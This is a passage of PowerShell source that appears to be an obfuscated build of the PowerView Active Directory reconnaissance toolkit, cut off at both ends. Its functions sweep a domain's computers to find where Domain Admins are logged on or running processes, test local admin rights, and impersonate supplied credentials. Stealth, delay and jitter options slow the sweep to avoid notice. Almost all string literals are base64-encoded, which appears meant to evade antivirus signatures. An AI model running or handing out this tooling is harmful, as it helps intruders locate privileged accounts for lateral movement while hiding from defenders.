                            if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName)) {
                                $UserLocation = New-Object PSObject
                                $UserLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $Null
                                $UserLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $UserName
                                $UserLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $TargetComputer
                                $UserLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAA=='))) $CName
                                try {
                                    $CNameDNSName = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                    $UserLocation | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) $CnameDNSName
                                }
                                catch {
                                    $UserLocation | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) $Null
                                }
                                if ($CheckAccess) {
                                    $Admin = (Test-AdminAccess -ComputerName $CName).IsAdmin
                                    $UserLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Admin.IsAdmin
                                }
                                else {
                                    $UserLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Null
                                }
                                $UserLocation.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAEwAbwBjAGEAdABpAG8AbgA='))))
                                $UserLocation
                            }
                        }
                    }
                    if (-not $Stealth) {
                        $LoggedOn = Get-NetLoggedon -ComputerName $TargetComputer
                        ForEach ($User in $LoggedOn) {
                            $UserName = $User.UserName
                            $UserDomain = $User.LogonDomain
                            if (($UserName) -and ($UserName.trim() -ne '')) {
                                if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName) -and ($UserName -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkACQA'))))) {
                                    $IPAddress = @(Resolve-IPAddress -ComputerName $TargetComputer)[0].IPAddress
                                    $UserLocation = New-Object PSObject
                                    $UserLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                                    $UserLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $UserName
                                    $UserLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $TargetComputer
                                    $UserLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) $IPAddress
                                    $UserLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAA=='))) $Null
                                    $UserLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) $Null
                                    if ($CheckAccess) {
                                        $Admin = Test-AdminAccess -ComputerName $TargetComputer
                                        $UserLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Admin.IsAdmin
                                    }
                                    else {
                                        $UserLocation | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Null
                                    }
                                    $UserLocation.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAEwAbwBjAGEAdABpAG8AbgA='))))
                                    $UserLocation
                                }
                            }
                        }
                    }
                }
            }
            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }
        $LogonToken = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainUserLocation] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random
            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, $LogonToken
                if ($Result -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFQAYQByAGcAZQB0ACAAdQBzAGUAcgAgAGYAbwB1AG4AZAAsACAAcgBlAHQAdQByAG4AaQBuAGcAIABlAGEAcgBsAHkA')))
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainUserLocation] Using threading with threads: $Threads"
            Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)"
            $ScriptParams = @{
                'TargetUsers' = $TargetUsers
                'CurrentUser' = $CurrentUser
                'Stealth' = $Stealth
                'TokenHandle' = $LogonToken
            }
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}
function Find-DomainProcess {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ProcessName,
        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',
        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $StopOnSuccess,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = $Unconstrained }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = $OperatingSystem }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = $ServicePack }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $ComputerSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $UserSearcherArguments = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $UserLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))] = $UserAdminCount }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $UserSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAAUQB1AGUAcgB5AGkAbgBnACAAYwBvAG0AcAB1AHQAZQByAHMAIABpAG4AIAB0AGgAZQAgAGQAbwBtAGEAaQBuAA==')))
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainProcess] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAATgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBOAGEAbQBlAA==')))]) {
            $TargetProcessName = @()
            ForEach ($T in $ProcessName) {
                $TargetProcessName += $T.Split(',')
            }
            if ($TargetProcessName -isnot [System.Array]) {
                $TargetProcessName = [String[]] @($TargetProcessName)
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $GroupSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            $GroupSearcherArguments
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        $HostEnumBlock = {
            Param($ComputerName, $ProcessName, $TargetUsers, $Credential)
            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    if ($Credential) {
                        $Processes = Get-WMIProcess -Credential $Credential -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    else {
                        $Processes = Get-WMIProcess -ComputerName $TargetComputer -ErrorAction SilentlyContinue
                    }
                    ForEach ($Process in $Processes) {
                        if ($ProcessName) {
                            if ($ProcessName -Contains $Process.ProcessName) {
                                $Process
                            }
                        }
                        elseif ($TargetUsers -Contains $Process.User) {
                            $Process
                        }
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainProcess] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainProcess] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random
            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainProcess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetProcessName, $TargetUsers, $Credential
                $Result
                if ($Result -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAAVABhAHIAZwBlAHQAIAB1AHMAZQByACAAZgBvAHUAbgBkACwAIAByAGUAdAB1AHIAbgBpAG4AZwAgAGUAYQByAGwAeQA=')))
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainProcess] Using threading with threads: $Threads"
            $ScriptParams = @{
                'ProcessName' = $TargetProcessName
                'TargetUsers' = $TargetUsers
                'Credential' = $Credential
            }
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}
function Find-DomainUserEvent {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName,
        [Parameter(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $Filter,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = [DateTime]::Now.AddDays(-1),
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = [DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
        $MaxEvents = 5000,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,
        [Switch]
        $CheckAccess,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $StopOnSuccess,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        $UserSearcherArguments = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))
        }
